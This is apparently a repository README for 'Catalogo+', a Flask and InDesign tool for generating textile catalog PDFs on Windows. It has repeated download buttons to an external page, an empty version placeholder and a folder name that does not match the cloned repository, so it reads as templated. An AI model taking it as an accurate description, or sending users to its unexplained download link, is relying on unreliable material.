# Catalogo+ web app 2026

> **Catalogo+ is a Windows-oriented web app for textile catalog automation that blends Python, Flask, and Adobe InDesign integration into a single workflow for generating PDFs in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryan-hayes86/catalogo-plus-windows-webapp-2026?style=flat-square)](https://github.com/ryan-hayes86/catalogo-plus-windows-webapp-2026)

---

<p align="center">
  <a href="https://ryan-hayes86.github.io/catalogo-plus-windows-webapp-2026/">
    <img src="https://img.shields.io/badge/Download-Catalogo%2B%20Latest-brightgreen?style=for-the-badge" alt="Download Catalogo+">
  </a>
</p>

> **[Direct Download - Catalogo+ v](https://ryan-hayes86.github.io/catalogo-plus-windows-webapp-2026/)**

---

[Download Latest Build](https://ryan-hayes86.github.io/catalogo-plus-windows-webapp-2026/)

---

## What Catalogo+ does

Catalogo+ is designed for catalog production pipelines where layout decisions, reference tracking, and file output need to stay in sync. It combines a browser-based interface with automated publishing steps, helping teams move from source data to finished catalog files without bouncing constantly between separate tools.

The app is especially suited to textile and fashion catalog work, where repeated revisions and consistent page structure are part of the routine. With live preview, modular catalog assembly, and PDF output powered by Python plus Adobe InDesign, it supports the full path from content selection to final export.

---

## Core capabilities

- Layout selection for catalog composition
- Reference management for organizing source content
- Real-time preview in 9:16 format
- Automatic PDF generation through InDesign integration
- Modular catalog generation for flexible workflows
- Process queue with a global lock for coordinated execution
- Waiting room behavior for users when the system is busy
- Timeout recovery with a kill switch for stalled jobs

---

## Installation

Clone the repository and open it in your preferred environment for Windows-based web app development.

1. Get the source:
   - git clone https://github.com/ryan-hayes86/catalogo-plus-windows-webapp-2026.git
2. Enter the project folder:
   - cd Catalogo_plus
3. Install the Python and Flask dependencies used by the application.
4. Make sure Adobe InDesign and the required automation setup are available before launching PDF-related workflows.

First run typically starts the web application entry point and then loads the catalog management interface in your browser or local environment.

---

## Usage

Typical workflow:

1. Start the Flask application.
2. Load or prepare the catalog data set.
3. Choose a layout for the current catalog.
4. Manage references and related content entries.
5. Review the live preview before finalizing.
6. Send the job through the queue for automated PDF generation.

Example launch pattern:

- python app.py

Once running, use the interface to review status, monitor queued work, and move through the catalog creation stages in order.

---

## Configuration

Settings are expected to live in the application configuration used by the Python/Flask stack and the InDesign automation layer.

Example structure:

    {
      "layout": "default",
      "preview_mode": "9:16",
      "queue_enabled": true,
      "pdf_output": "exports/"
    }

Adjust paths, queue behavior, and output locations to match your environment and catalog workflow.

---

## Requirements

- Windows platform
- Python runtime
- Flask web framework
- Adobe InDesign integration for automated PDF generation
- Storage for catalog assets, references, and exported files
- Network or local access suitable for full-stack web app operation

---

## FAQ

**How do I update Catalogo+?**  
Swap in the newest build from the repository or deployment source, then check for any config updates before you restart the app.

**Where are the catalog settings stored?**  
Configuration lives in the Python/Flask application setup and the supporting workflow files. Look through the project layout for environment and automation settings.

**What should I do if a job is stuck in the queue?**  
Use the application's queue controls and recovery tools. The queue system includes timeout recovery plus a kill switch for tasks that hang.

**Can I change layouts after starting a project?**  
Yes. Layout selection is part of the workflow, so the template choice can be changed before the final PDF is produced.

**Who is this project for?**  
It is meant for textile and fashion catalog workflows where previewing, reference handling, and repeated exporting are everyday tasks.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
